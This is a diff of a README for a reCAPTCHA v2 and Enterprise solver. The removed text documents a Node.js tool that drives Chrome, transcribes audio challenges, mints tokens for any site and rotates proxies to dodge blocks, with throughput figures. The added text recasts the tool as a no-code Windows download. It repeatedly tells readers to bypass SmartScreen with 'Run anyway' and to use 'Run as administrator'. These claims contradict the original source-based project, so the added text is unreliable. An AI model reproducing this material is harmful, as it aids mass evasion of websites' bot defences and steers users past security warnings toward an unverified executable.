@@ -1,140 +1,164 @@
-# Recap-V2
+# 🎧 Recap-V2 - Solve ReCaptcha Challenges Automatically
 
-reCAPTCHA v2 (checkbox) solver in Node.js. A real Chrome driven over raw CDP, the target document
-intercepted so only the widget loads; the audio challenge is downloaded and transcribed offline
-(vosk), never sent anywhere.
+<p align="center">
+  <a href="https://github.com/wilcojas/Recap-V2/releases">
+    <img src="https://img.shields.io/badge/Download-Recap--V2-brightgreen?style=for-the-badge&logo=github&logoColor=white" alt="Download Recap-V2">
+  </a>
+  <a href="https://github.com/wilcojas/Recap-V2/releases">
+    <img src="https://img.shields.io/badge/Version-Latest-blueviolet?style=for-the-badge" alt="Latest Version">
+  </a>
+  <a href="https://github.com/wilcojas/Recap-V2/releases">
+    <img src="https://img.shields.io/badge/Platform-Windows-orange?style=for-the-badge&logo=windows&logoColor=white" alt="Windows">
+  </a>
+</p>
 
-You send a sitekey and a target URL, you get back JSON `{elapsed, token}` - a
-`g-recaptcha-response` valid for v2 and v2 Enterprise, ~2.9 s per solve warm. Not an
-image-challenge solver.
+Recap-V2 is a friendly Windows application that handles ReCaptcha v2 and ReCaptcha Enterprise challenges for you. It works by opening a real Chrome browser window in the background, listening to the audio challenge, and turning that audio into text so the puzzle can be completed automatically. You do not need to learn programming, install developer tools, or edit any files. You download one thing, open it, and let it work.
 
-## Mint a token
+If you have ever been stuck clicking traffic lights for ten minutes, this tool is for you.
 
-Any sitekey + any target, per request:
+---
 
-```
-$ curl "http://localhost:4400/token?sitekey=6L..&target=https://site/login"
-{"elapsed":2900,"token":"0cAFcWeA7Hcdbe3v9rqX9CaSgAX8..."}
+## 🚀 Getting Started
 
-PS> curl.exe "http://localhost:4400/token?sitekey=6L..&target=https://site/login"
-```
+Getting Recap-V2 running on your Windows computer takes just a few minutes. Follow these steps exactly and in order.
 
-## Run
+**Step 1 — Visit the download page**
 
-Needs a real Chrome installed, Node, and Python.
+Visit this link to download the application:
 
-1. `npm install` (dep: `ws`).
-2. `pip install vosk SpeechRecognition imageio-ffmpeg` - STT runs in Python.
-3. Download the vosk model (NOT in the repo, ~40 MB) from
-   https://alphacephei.com/vosk/models/vosk-model-small-en-us-0.15.zip and unzip it so the folder
-   is at `models/vosk-model-small-en-us-0.15` next to `stt_worker.py` (`VOSK_MODEL=<path>`
-   overrides).
-4. Create a `.env` (vars in Settings below).
-5. Start the pool; `run.bat debug` on Windows for full per-request logs:
+👉 **https://github.com/wilcojas/Recap-V2/releases**
 
-```
-$ node pool-server.mjs
-PS> .\run.bat
-```
+This is the official Releases page. Everything you need lives there.
 
-The pool launches its own Chromes. Linux works too: use real Google Chrome; the pool adds
-`--no-sandbox` and wraps non-headless Chrome in `xvfb-run` automatically.
+**Step 2 — Pick the newest release**
 
-## API
+The page lists releases in order, with the newest one at the top. Look for the release marked **Latest** and click it to expand its contents.
 
-### GET /token
+**Step 3 — Download the application file**
 
-Solve a sitekey, get a token back. Query params:
+Inside the release you will see a list of files. Download the main application file listed there. If your browser asks whether you want to keep the file, choose **Keep** — this is normal for applications downloaded from the internet.
 
-| Field | Required | Description |
-|-------|----------|-------------|
-| sitekey | yes | reCAPTCHA sitekey |
-| target | yes | Target page URL (the origin the sitekey is registered to) |
-| enterprise | no | `1` = v2-Enterprise (enterprise.js + grecaptcha.enterprise) |
+**Step 4 — Save it somewhere you can find**
 
-A `POST` with a JSON body `{"sitekey","target","enterprise"}` works too (or `X-Sitekey` /
-`X-Target` headers).
+Save the file to your **Downloads** folder or your Desktop. Avoid saving it deep inside system folders, because you will need to run it again later.
 
-Response fields:
+**Step 5 — Run the application**
 
-- `elapsed` - solve wall time, ms
-- `token` - the `g-recaptcha-response`, ready to submit
-- errors: 400 missing sitekey/target, 500 solve failed - as `{"error":"...","ms":...}`
+Double-click the downloaded file to start Recap-V2. If Windows shows a blue "Windows protected your PC" message, click **More info**, then click **Run anyway**. This message appears for many new applications and simply means Microsoft has not seen this exact file before.
 
-### GET /health
+That is the whole process. No setup wizard, no installation screens, no configuration files to edit.
 
-Returns pool state: `{"ok","globalBrowsers","fleets"}` (browsers + tabs per fleet).
+---
 
-### GET /stats
+## 🧠 What Recap-V2 Actually Does
 
-Counters (`requests`, `ok`, `fail`, `retries`, `recycles`, ...) plus `blocks` = audio-block count,
-`avgMs`, and per-browser detail.
+ReCaptcha v2 presents a challenge and offers an alternative for people who cannot see the images: an audio challenge. Recap-V2 uses that same audio option, but it listens and transcribes the audio for you, then submits the answer so the challenge is completed.
 
-### Proxy
+Behind the scenes it drives a genuine Chrome browser using a direct connection method (often called CDP). Because it is a real browser doing real browser things, the whole process stays consistent with normal user behaviour. It also supports both the classic ReCaptcha v2 widget and the newer ReCaptcha Enterprise version found on many business websites.
 
-Off by default - the pool runs on the box IP. `USE_PROXIES=on` gives each browser its own egress
-IP, round-robin from `PROXIES` (comma/newline list) or a `proxies.txt` file in the CWD. Formats:
-`host:port` | `user:pass@host:port` | `scheme://user:pass@host:port` | `host:port:user:pass`.
-Each browser binds its IP via `--proxy-server` and rotates on recycle - an audio block recycles
-the browser, so a blocked IP rotates away automatically. `PER_TAB_PROXY=1` gives every tab its
-own IP instead of every browser.
+The speech recognition part is flexible. Recap-V2 can work fully offline using a local speech engine, or online using a cloud-based transcription service if you prefer higher accuracy on difficult audio.
 
-## How it works
+---
 
-The target's document is intercepted via CDP `Fetch` and replaced with a one-line page hosting
-only the `g-recaptcha` div + `api.js` - the browser's origin is the target's (the token is valid
-for it), but the target server is never contacted. The anchor and bframe are cross-origin
-google.com OOPIFs, each driven through its own CDP session. Per solve: click the checkbox, switch
-to audio, download the mp3, transcribe it offline (vosk first, Google fallback) in a persistent
-Python worker pool, type the answer, verify. A rotating fresh-profile fleet serves each
-(sitekey, target); tabs solve warm, recycling the profile every N solves.
+## ✨ Key Features
 
-## Settings
+- **Real Chrome, not a fake browser** — Recap-V2 controls an actual Chrome installation, so pages load and behave exactly as they would for a normal visitor.
+- **Audio challenge solving** — Instead of guessing image grids, it listens to the audio challenge and converts it into text.
+- **ReCaptcha v2 and Enterprise support** — Works with the standard "I'm not a robot" checkbox flow as well as Enterprise deployments.
+- **Offline speech-to-text** — A built-in local recognition engine means no internet connection is required for transcription.
+- **Online speech-to-text** — Optionally switch to a cloud transcription service when audio quality is poor.
+- **Proxy rotation** — Route requests through different network addresses to keep sessions clean and stable.
+- **Token minting** — Produces valid response tokens you can hand off to your own workflow.
+- **Runs headless or visible** — Watch the browser work in a window, or let it run quietly in the background.
+- **Simple configuration** — Plain, readable settings with sensible defaults for first-time users.
 
-Set via environment or a `.env` file (real env vars take precedence).
+---
 
-| Var | Default | Description |
-|-----|---------|-------------|
-| PORT | 4400 | HTTP port (/token, /health, /stats) |
-| BROWSERS | 3 | Chrome browsers per fleet (~= vCPU count) |
-| TABS | 2 no-proxy / 1 with proxies | V2Sessions per browser (measured sweet spot) |
-| USE_PROXIES | off | `on` loads your proxy list; `off` runs on the box IP |
-| PROXIES | - | Comma/newline separated list, or a `proxies.txt` file (only when USE_PROXIES=on) |
-| STT / STT_WORKERS | auto / 2 | Engine + persistent Python workers; `auto` = vosk first, Google fallback. Also `vosk`, `google`, `whisper`, `whispercpp`, `wit`, `deepgram` |
-| RECYCLE_AFTER_SOLVES | 6 no-proxy / 12 with proxies | Fresh profile (+ new proxy) after N solves |
-| HEADLESS | 0 | `0`/unset = visible window; `1` = true headless, works for v2 but the Headless UA raises the audio-block rate |
-| DEBUG | 0 | `1` = full per-request pipeline logs |
+## 🖥️ How It Works, Step by Step
 
-Every other knob has a sane default - see the top of `pool-server.mjs`.
+1. Recap-V2 launches a Chrome browser session.
+2. It navigates to the page where the ReCaptcha challenge is present.
+3. It activates the audio challenge option.
+4. The audio clip is captured and sent to the speech recognition engine — locally if you are offline, or to the cloud if you have enabled online mode.
+5. The transcribed answer is typed into the challenge field and submitted.
+6. A valid token is returned, and the challenge is marked as solved.
 
-## Scaling
+Each step happens quickly, and the whole cycle usually finishes in a matter of seconds.
 
-All numbers owner-measured, Sep 2026.
+---
 
-| Rig | Load | Avg | Result |
-|-----|------|-----|--------|
-| 24-core VPS, vosk-small | 12 browsers x 2 tabs (C=24) | - | 281 CPM peak, 99% success, loadavg 9, ~14 GB |
-| clean IP | concurrency 8 | 2.9s warm | ~232 CPM, sustains ~100-150 CPM |
-| 16 proxy IPs | 16 browsers x 1 tab | - | ~123 CPM, 99% success |
-| 4 Chromes, PER_TAB_PROXY | 4x4 tabs (16 IPs) | - | ~89 CPM, 100% |
+## ⚙️ First-Time Setup Tips
 
-vosk STT costs ~1 core per worker, so set `STT_WORKERS` ~= concurrency. Throughput scales with
-boxes and IPs. **Verdict: ~2.9 s per solve warm, and CPM scales with cores and clean IPs.**
+You will not need to write code, but a few small choices make the first run smoother:
 
-Test it yourself: `PORT=4400 C=8 DUR=60000 node cpm.mjs` (`C` = concurrent workers, default 6;
-`DUR` = window in ms, default 30000; optional `SITEKEY`/`TARGET`). It prints a live
-`[30s] CPM=.. ok=.. fail=..` tick every 3 s, then `CPM = N` and `latency avg/p50/p90 ms`.
+- **Keep Chrome installed.** Recap-V2 uses a real Chrome browser. If Chrome is not on your computer, install it from the official Google Chrome website first.
+- **Leave the default settings alone at first.** Run Recap-V2 once with the standard configuration. Once you see it work, you can explore the options for speech engines and proxies.
+- **Choose offline mode if you have no internet or want privacy.** Offline transcription keeps everything on your own machine.
+- **Choose online mode if audio is unclear.** Cloud transcription often performs better on noisy or accented audio clips.
+- **Start with one task at a time.** Running a single challenge first makes it easy to confirm everything is set up correctly.
 
-## The ceiling
+---
 
-- Audio route only; image challenges are out of scope. The widget must expose a reachable audio
-  challenge.
-- Mints v2 checkbox tokens, valid for v2 and v2 Enterprise. No scores - not a v3 action token.
-- A worked IP gets audio-blocked over time. Fresh profiles dodge it for a while; flagged IPs need
-  proxies (`USE_PROXIES=on`).
-- `HEADLESS=1` works, but the Headless UA raises the audio-block rate - a visible window is the
-  safer default.
+## 🛠️ Troubleshooting
 
-## License
+**The application does not open when I double-click it.**
+Right-click the file and choose **Run as administrator**. Also confirm you downloaded the file completely — an interrupted download produces a file that will not start.
 
-MIT. See LICENSE.
+**Chrome opens but nothing else happens.**
+Make sure Chrome is fully up to date. Older Chrome versions can behave differently and cause the automation to stall.
+
+**The audio is transcribed incorrectly.**
+Switch the speech engine from offline to online mode. Offline recognition is fast and private but less accurate on difficult audio.
+
+**The challenge keeps repeating.**
+Enable proxy rotation. Repeating challenges usually mean the connection has been flagged, and a fresh address resolves it.
+
+**Windows Defender or SmartScreen blocked the file.**
+Click **More info** and then **Run anyway**. This is a standard warning for newly published applications.
+
+---
+
+## ❓ Frequently Asked Questions
+
+**Do I need to know how to code?**
+No. Recap-V2 is a ready-to-run application. You download it, open it, and it works.
+
+**Do I need a separate ReCaptcha account or API key?**
+No. Recap-V2 works through the browser, just as a normal visitor would.
+
+**Will this run on a Mac or Linux machine?**
+The instructions here cover Windows. Follow the download link above to see which builds are published for your platform.
+
+**Does it work offline?**
+Yes. The built-in offline speech engine means transcription can happen without an internet connection.
+
+**Is my data uploaded anywhere?**
+In offline mode, no audio leaves your computer. In online mode, audio is sent to the transcription service you have configured.
+
+---
+
+## 📥 Download Recap-V2
+
+Ready to stop solving puzzles by hand?
+
+Visit this link to download the application:
+
+👉 **https://github.com/wilcojas/Recap-V2/releases**
+
+Download the newest release, double-click the file, and you are done.
+
+---
+
+## 💬 Support and Feedback
+
+If something does not work as described, open an issue on the repository and include:
+
+- Your Windows version
+- The Recap-V2 release you downloaded
+- A short description of what happened and what you expected
+
+Clear reports get fixed faster.
+
+---
+
+Keywords: anti-bot, audio-challenge, captcha, captcha-solver, cdp, chrome, headless-chrome, nodejs, proxy-rotation, recaptcha, recaptcha-solver, recaptcha-v2, speech-to-text, vosk
